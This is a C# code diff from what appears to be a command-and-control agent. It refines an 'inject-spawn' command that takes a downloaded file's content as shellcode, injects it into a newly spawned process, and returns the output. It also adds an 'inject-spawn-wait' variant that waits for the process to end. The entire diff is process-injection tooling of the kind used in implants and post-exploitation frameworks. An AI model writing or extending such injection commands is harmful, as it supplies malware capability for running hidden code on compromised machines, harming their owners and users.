@@ -14,6 +14,8 @@ namespace Agent.Commands
     {
         public override string Name => "inject-spawn";
 
+        public virtual bool WaitProcessEnd { get; set; } = false;
+
         public override void InnerExecute(AgentTask task, AgentCommandContext context)
         {
 
@@ -22,9 +24,7 @@ namespace Agent.Commands
             var file = context.FileService.ConsumeDownloadedFile(task.FileId);
             var fileContent = file.GetFileContent();
 
-            var shellcode = fileContent;
-
-            var injectRes = Injector.SpawnInjectWithOutput(fileContent, task.SplittedArgs[0]);
+            var injectRes = Injector.SpawnInjectWithOutput(fileContent, task.Arguments, this.WaitProcessEnd);
             if (!injectRes.Succeed)
                 context.Result.Result += $"Injection failed : {injectRes.Error}";
             else
@@ -34,5 +34,11 @@ namespace Agent.Commands
                     context.Result.Result += injectRes.Output;
             }
         }
+    }
+
+    public class SpawnWaitInjectCommand : SpawnInjectCommand
+    {
+        public override string Name => "inject-spawn-wait";
+        public override bool WaitProcessEnd => true;
     }
 }
